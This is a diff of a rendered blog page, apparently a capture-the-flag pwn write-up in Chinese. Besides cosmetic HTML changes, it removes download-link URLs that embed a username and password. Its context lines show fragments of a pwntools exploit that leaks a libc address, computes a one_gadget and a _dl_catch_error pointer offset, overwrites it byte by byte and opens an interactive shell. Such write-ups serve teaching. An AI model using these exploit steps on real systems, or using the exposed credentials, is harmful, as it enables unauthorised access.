@@ -81,7 +81,7 @@
               ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item">
               <a
                 class="menu-link"
-                href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                href="https://download.roderickchan.cn/"
                 title="我的资源下载中心"
                 rel="noopener noreferrer" target="_blank"
               ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
@@ -168,7 +168,7 @@
               class="menu-item"
             ><a
                   class="menu-link"
-                  href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                  href="https://download.roderickchan.cn/"
                   title="我的资源下载中心"
                   rel="noopener noreferrer" target="_blank"
                 ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li
@@ -322,7 +322,7 @@
 <ul>
 <li>
 <p>首先，泄露出地址，并计算出<code>libc</code>基地址，同时得到需要跳转的地址</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-1"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -347,15 +347,14 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">one_gadget1</span> <span class="o">=</span> <span class="n">libc_base_addr</span> <span class="o">+</span> <span class="mh">0xe569f</span>
 </span></span><span class="line"><span class="cl"><span class="n">_dl_catch_error_offset</span> <span class="o">=</span> <span class="mh">0x5f4038</span>
-</span></span><span class="line"><span class="cl"><span class="n">target_addr</span> <span class="o">=</span> <span class="n">libc_base_addr</span> <span class="o">+</span> <span class="n">_dl_catch_error_offset</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">target_addr</span> <span class="o">=</span> <span class="n">libc_base_addr</span> <span class="o">+</span> <span class="n">_dl_catch_error_offset</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210421235945084.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210421235945084.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210421235945084.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210421235945084.png 2x" sizes="auto" data-title="image-20210421235945084" data-alt="image-20210421235945084" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422000022426.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422000022426.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422000022426.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422000022426.png 2x" sizes="auto" data-title="image-20210422000022426" data-alt="image-20210422000022426" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 </li>
 <li>
 <p>然后，修改目标地址为<code>one_gadget</code></p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-2"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -372,8 +371,7 @@
 </span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;biang!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="n">input_gadget</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">    <span class="n">input_gadget</span> <span class="o">=</span> <span class="n">input_gadget</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422000101901.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422000101901.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422000101901.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422000101901.png 2x" sizes="auto" data-title="image-20210422000101901" data-alt="image-20210422000101901" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 </li>
@@ -395,7 +393,7 @@
 <p>这正是我们上面改的地址，存储着<code>_dl_catch_error@plt+6</code>，所以最终需要更改的偏移为<code>0x5f4038</code>：</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422001200763.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422001200763.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422001200763.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422001200763.png 2x" sizes="auto" data-title="image-20210422001200763" data-alt="image-20210422001200763" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h4 id="完整exp">完整exp</h4>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-3"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -462,8 +460,7 @@
 </span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;biang!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="n">input_gadget</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">    <span class="n">input_gadget</span> <span class="o">=</span> <span class="n">input_gadget</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>最后远程攻击效果如下：</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422001633544.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422001633544.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422001633544.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422001633544.png 2x" sizes="auto" data-title="image-20210422001633544" data-alt="image-20210422001633544" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
